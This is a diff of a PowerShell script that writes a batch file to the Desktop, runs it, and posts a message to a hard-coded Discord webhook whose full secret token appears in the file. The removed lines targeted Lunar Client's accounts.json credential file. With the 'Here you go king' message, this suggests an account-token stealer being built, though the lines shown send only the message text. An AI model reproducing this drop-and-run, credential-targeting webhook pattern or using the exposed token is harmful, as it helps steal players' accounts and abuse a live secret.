@@ -1,8 +1,8 @@
-# Define the path for the batch file
+# 1. Define the path for the local batch file
 $desktopPath = [System.Environment]::GetFolderPath('Desktop')
-$batchFilePath = Join-Path $desktopPath 'send_webhook.bat'
+$batchFilePath = Join-Path $desktopPath 'run_bot.bat'
 
-# Define the content of the batch file
+# 2. Define the content for the local batch file
 $batchContent = @"
 @echo off
 setlocal enabledelayedexpansion
@@ -10,31 +10,19 @@ setlocal enabledelayedexpansion
 :: Discord Webhook URL
 set webhookUrl=https://discord.com/api/webhooks/1475770175990005811/jFwwFfOqY9AlMr54QfT1B_BPeDHItn5YljgnR9FjjugrBPxKiFmLzTkg9fLrQvoN0-NX
 
-:: Check if accounts.json exists
-set filePath=%USERPROFILE%\.lunarclient\settings\game\accounts.json
-if not exist "%filePath%" (
-    echo accounts.json not found.
-    exit /b
-)
-
-:: Message to send
+:: Message Content
 set message=Here you go king :pray:
 
-:: Escape the message for CURL
-set payload={""content"":""%message%""}
+:: 3. Use PowerShell to send the request (This is the fix)
+powershell -Command "Invoke-RestMethod -Uri '%webhookUrl%' -Method Post -ContentType 'application/json' -Body '{''content'':''%message%''}'"
 
-:: Send Request
-curl -X POST %webhookUrl% ^
-    -H ""Content-Type: application/json"" ^
-    -d ""%payload%""
-
-echo Process finished.
+echo Done.
 endlocal
 "@
 
-# Create the batch file
+# 4. Save the batch file
 Set-Content -Path $batchFilePath -Value $batchContent
 
-# Run the batch file
+# 5. Run the batch file
 Start-Process -FilePath $batchFilePath
-Write-Host "Webhook message sent."
+Write-Host "Script generated and launched."
